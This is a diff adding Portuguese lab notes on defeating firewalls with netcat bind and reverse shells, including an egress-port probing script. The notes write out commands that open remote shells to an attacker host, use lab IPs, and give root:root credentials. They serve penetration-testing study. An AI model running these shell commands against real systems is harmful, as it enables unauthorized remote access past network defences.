@@ -64,3 +64,58 @@ Na maquina atacante usamos `nc -vn {ip alvo} {porta}` e ja temos um shell, podem
 - **Reverse shell** -> Maquina atacante fica esperando uma conexao, maquina alvo conecta e **envia** a shell
 
 No reverse shell, iniciamos com a **maquina do atacante** escutando em uma porta exemplo `nc -vnlp {porta}` e entao na **maquina alvo**  `nc -vn {ip do atacante} {porta} -e cmd.exe # ou /bin/bash para linux` aqui nos conectamos na maquina atacante e enviamos o shell para ela.
+
+
+# Vencendo o Firewall
+
+## Cenario 1 - Bind shell simples
+
+Acesso via SSH conectado a VPN
+IP 172.16.1.5
+root:root
+Local das regras do firewall /home/msfadmin/firewall/
+
+Cenario sem firewall, basta realizar um bind shell, conectado no ssh do alvo, usando o `nc -vnlp 5050 -e /bin/bash` abrimos a shell e na maquina atacante com `nc -vn 172.16.1.5 5050` recebemos a shell.
+
+## Cenario 2 - Bind shell com porta "closed"
+
+Firewall basico
+Acesso direto nao funciona mais
+
+Nesse caso notamos a porta 443 que esta *fechada*. Com nao tem nenhum servico rodando la, conseguimos usar o netcat na maquina alvo novamente com `nc -vnlp 443 -e /bin/bash` e na maquina atacante novamente `nc -vn 172.16.1.5 443` desse forma realizando novamente um bind shell, usando uma porta reconhecida pelo firewall mas sem servico ativo.
+
+## Cenario 3 - Reverse shell basico
+
+Nova regra de firewall, acesso direto nao funciona mais, pois toda entrada esta filtrada.
+
+Nesse caso bind shell nao funciona, pois todo trafego e bloqueado na entrada. Caso perfeito para o reverse shell.
+
+Na maquina do **atacante** abrimos a porta com `nc -vnlp 5050` e na maquina alvo enviamos a shell com `nc -vn {ip} 5050 -e /bin/bash` e recebemos a shell na maquina atacante.
+
+## Cenario 4 - Egress firewall
+
+Regra de firewall restritiva que bloqueia trafego de entrada e saida.
+
+Bypass: Egress Firewall - criar uma forma de tentar estabelecer conexoes de saida, encontrar uma porta valida e fazer o reverse shell usando ela.
+
+Na maquina atacante vamos abrir as portas com um script sh
+```shell
+nc -vnlp 80&
+sleep 2
+nc -vnlp 443&
+sleep2
+nc -vnlp 53&
+netstat -nlpt
+```
+e no servidor fazemos o mesmo script para testar a saida
+```shell
+nc -vn {ip} 80&
+sleep 2
+nc -vn {ip} 443&
+sleep 2
+nc -vn {ip} 53&
+```
+Primeiro executamos na maquina atacante e em seguida na maquina alvo, podemos adicionar um ` | grep "open"` para filtrar apenas as portas abertas.
+No exemplo as tres portas estao disponiveis, entao podemos usar qualquer uma dessas para um reverse shell.
+
+**Em casos praticos** muitas vezes protocolos especificos ficam disponiveis, entao alem de achar a porta correta, temos que achar o protocolo correto.
